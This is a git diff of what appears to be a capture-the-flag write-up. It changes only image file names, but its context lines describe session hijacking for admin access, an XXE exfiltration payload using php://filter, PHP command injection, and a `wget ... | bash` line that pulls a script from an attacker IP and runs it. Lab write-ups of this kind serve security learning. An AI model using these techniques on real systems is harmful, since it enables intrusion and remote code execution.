@@ -107,7 +107,7 @@ token=ddac62a28254561001277727cb397baf
 
 By replacing the PHPSESSID with our own created user, we can become an administrator by sending the same POST request to the website.
 
-<figure><img src="../../../.gitbook/assets/image (37) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (37) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 From here, we can register our own user and gain access to the API stuff.
 
@@ -147,7 +147,7 @@ After some trial and error, I found that using the `php://filter/` method worked
 %exfiltrate;
 ```
 
-<figure><img src="../../../.gitbook/assets/image (35) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Payload used:
 
@@ -213,7 +213,7 @@ Testing this out, I used this command ``<?= `id` ?>.``
 
 This worked out pretty well as I was able to see the output here.
 
-<figure><img src="../../../.gitbook/assets/image (38) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (38) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can then replace the command with ``<?=`wget -O - 10.10.14.152/b|bash` ?>``
 
